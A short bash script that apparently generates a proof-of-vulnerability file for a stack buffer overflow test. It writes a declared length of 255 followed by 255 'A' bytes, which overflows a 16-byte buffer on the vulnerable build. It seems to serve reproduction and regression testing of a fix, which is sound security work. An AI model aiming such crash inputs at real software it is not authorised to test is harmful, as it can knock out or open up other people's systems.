#!/usr/bin/env bash
#
# Generate the proof-of-vulnerability input deterministically:
#   byte 0    = 0xFF  (declared payload length = 255)
#   bytes 1.. = 255 payload bytes (0x41 'A')
#
# Total 256 bytes. On the vulnerable build this copies 255 bytes into a
# 16-byte stack buffer; on the fixed build it is rejected (length > 16).
set -euo pipefail

out="$(cd "$(dirname "$0")" && pwd)/crash.bin"
{ printf '\xff'; head -c 255 /dev/zero | tr '\0' 'A'; } > "$out"
echo "wrote $out ($(wc -c < "$out") bytes)"
